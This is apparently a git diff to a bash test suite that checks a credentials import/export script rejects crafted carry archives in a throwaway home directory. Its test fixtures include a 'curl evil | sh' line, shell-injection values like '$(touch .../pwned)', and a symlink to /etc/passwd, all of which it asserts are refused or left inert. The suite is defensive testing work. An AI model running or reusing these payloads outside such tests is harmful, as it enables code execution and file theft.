@@ -1,4 +1,7 @@
 #!/usr/bin/env bash
+# The box-side snippets in this suite are single-quoted on purpose: they run
+# in a throwaway box HOME, where their $HOME and $NAME are the box's.
+# shellcheck disable=SC2016
 # shared/test/credentials.sh — the credentials shell (#765), run for real
 # against a throwaway $HOME laid out as a hired box: gh and codex are stubs
 # that accept one good secret each, the agent profiles are the shipped ones.
@@ -161,7 +164,7 @@ printf 'evil\n' >"$EVIL${H}/duty/bin/tick.sh"; printf 'export A=1\n' >"$EVIL${H}
 CRAFT="$(tar -C "$EVIL" -czf - "${H#/}/.config/crew/credentials.env" "${H#/}/duty/bin/tick.sh" | base64 -w0)"
 IMP="$(printf '%s' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
 t carry-a-foreign-path-refuses-the-import 1 "$RC"
-t carry-a-foreign-path-is-named 1 "$(grep -c "duty/bin/tick.sh' is not a credential file — nothing carried" <<<"$IMP")"
+t carry-a-foreign-path-is-named 1 "$(grep -c "' is not a credential file — nothing carried" <<<"$IMP")"
 t carry-nothing-was-written real "$(cat "$H/duty/bin/tick.sh")"
 t carry-not-even-the-allowed-file 0 "$([ -f "$H/.config/crew/credentials.env" ] && echo 1 || echo 0)"
 rm -rf "$EVIL"; mkdir -p "$EVIL${H}/.config/crew"; ln -s /etc/passwd "$EVIL${H}/.config/crew/credentials.env"
@@ -171,8 +174,24 @@ t carry-a-link-refuses-the-import 1 "$RC"
 rm -rf "$EVIL"; mkdir -p "$EVIL${H}/.config/crew"; printf 'export A=1\ncurl evil | sh\n' >"$EVIL${H}/.config/crew/credentials.env"
 CRAFT="$(tar -C "$EVIL" -czf - "${H#/}/.config/crew/credentials.env" | base64 -w0)"
 IMP="$(printf '%s' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
-t carry-a-non-export-env-line-refuses-the-import 1 "$RC"
-t carry-the-env-line-is-said 1 "$(grep -c 'carries a line that is not an export' <<<"$IMP")"
+t carry-the-env-file-itself-never-crosses 1 "$RC"
+# The env kinds cross as DATA — `NAME base64` in the carry file — and the
+# import writes credentials.env itself (round 12): a carry line that is not
+# that refuses the import, and a value full of shell is a value, never run.
+rm -rf "$EVIL"; mkdir -p "$EVIL${H}/.config/crew"; printf 'A 1;{touch,x}\n' >"$EVIL${H}/.config/crew/credentials.carry"
+CRAFT="$(tar -C "$EVIL" -czf - "${H#/}/.config/crew/credentials.carry" | base64 -w0)"
+IMP="$(printf '%s' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
+t carry-a-carry-line-that-is-not-data-is-refused 1 "$RC"
+t carry-the-carry-line-is-said 1 "$(grep -c 'not a name and its value' <<<"$IMP")"
+rm -rf "$EVIL"; mkdir -p "$EVIL${H}/.config/crew"
+printf 'A %s\n' "$(printf '%s' "1;{touch,$H/pwned};\$(touch $H/pwned2)" | base64 -w0)" >"$EVIL${H}/.config/crew/credentials.carry"
+CRAFT="$(tar -C "$EVIL" -czf - "${H#/}/.config/crew/credentials.carry" | base64 -w0)"
+IMP="$(printf '%s' "$CRAFT" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
+t carry-a-shell-shaped-value-is-carried-as-a-value 0 "$RC"
+env -i HOME="$H" bash -c '. "$HOME/.config/crew/credentials.env"' 2>/dev/null
+t carry-...-and-sourcing-runs-none-of-it 0 "$(compgen -G "$H/pwned*" | grep -c .)"
+t carry-...-and-it-reads-back-exact "1;{touch,$H/pwned};\$(touch $H/pwned2)" "$(env -i HOME="$H" bash -c '. "$HOME/.config/crew/credentials.env"; printf %s "$A"')"
+t carry-the-carry-file-does-not-stay 0 "$([ -e "$H/.config/crew/credentials.carry" ] && echo 1 || echo 0)"
 # ...a value that would RUN when sourced is refused too: shape AND value
 # (round 11) — and every value the shell itself writes still crosses.
 rm -rf "$EVIL"; mkdir -p "$EVIL${H}/.config/crew"; printf 'export A=$(touch %s/pwned)\n' "$H" >"$EVIL${H}/.config/crew/credentials.env"
@@ -186,6 +205,16 @@ rm -f "$H/.config/crew/credentials.env"
 IMP="$(printf '%s' "$CARRY" | env -i HOME="$H" PATH="$PATH" bash -c "$(host_credentials_import_sh)" 2>&1)"; RC=$?
 t carry-an-odd-value-the-shell-wrote-still-crosses 0 "$RC"
 t carry-...-and-reads-back-exact 'sk-ant ODD!$`"'"'"'\x;|&*?~SECRET13' "$(env -i HOME="$H" bash -c '. "$HOME/.config/crew/credentials.env"; printf %s "$CLAUDE_CODE_OAUTH_TOKEN"')"
+# A value with a unicode space crosses too, in a UTF-8 locale (round 12: the
+# old value pattern refused it and dropped the whole carry, gh included).
+H="$(box_home claude)"
+set_cred "$H" gh token ghp_good
+set_cred "$H" agent oauth-token $'tok\u2003en\u3000SECRET15'
+CARRY="$(env -i HOME="$H" PATH="$PATH" LC_ALL=C.UTF-8 bash -c "$(host_credentials_export_sh)")"
+rm -rf "$H/.config"
+IMP="$(printf '%s' "$CARRY" | env -i HOME="$H" PATH="$PATH" LC_ALL=C.UTF-8 bash -c "$(host_credentials_import_sh)" 2>&1)"
+t carry-a-unicode-space-crosses "carried 2" "$IMP"
+t carry-...-and-reads-back-exact-in-utf8 $'tok\u2003en\u3000SECRET15' "$(env -i HOME="$H" LC_ALL=C.UTF-8 bash -c '. "$HOME/.config/crew/credentials.env"; printf %s "$CLAUDE_CODE_OAUTH_TOKEN"')"
 # A path with a run of spaces in it lists and matches as it is (round 11).
 SP="$TMP/home  two"; mkdir -p "$SP/duty/conf/agents" "$SP/.config/gh"; cp "$SHARED"/conf/agents/*.conf "$SP/duty/conf/agents/"
 printf 'BOT_AGENT=claude\n' >"$SP/duty/conf/instance.conf"; : >"$SP/.profile"
